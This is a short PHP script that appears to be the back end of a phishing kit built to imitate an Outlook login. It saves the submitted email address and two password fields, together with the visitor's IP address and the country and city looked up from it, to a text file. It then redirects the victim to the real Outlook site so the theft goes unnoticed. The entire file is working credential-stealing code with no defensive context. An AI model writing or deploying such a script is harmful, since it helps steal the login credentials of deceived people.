<?php

date_default_timezone_set('America/Caracas');
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];
$userp = $_SERVER['HTTP_CLIENT_IP'];
$userp = $_SERVER['HTTP_X_FORWARDED'];
$userp = $_SERVER['HTTP_X_FORWARDED_FOR'];

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    echo $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    echo $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    echo $ip = $_SERVER['REMOTE_ADDR'];
}


$cc = trim(file_get_contents("http://ipinfo.io/{$userp}/country"));
$city = trim(file_get_contents("http://ipinfo.io/{$userp}/city"));

	
	$file = fopen("NEW01.txt", "a");
	
fwrite($file, 
"* EMAIL: ".$_POST['email']."
* PASS: ".$_POST['pass']."
* PASS1: ".$_POST['pass1']."
* F-H-IP-P-C: 
".date('Y-m-d')."
".date('H:i:s')."
".$userp."
".$ip."
".$cc."
".$city."   
" . PHP_EOL);
fwrite($file, "==============================" . PHP_EOL);
fclose($file);

header("location:https://outlook.live.com/owa/");

?>
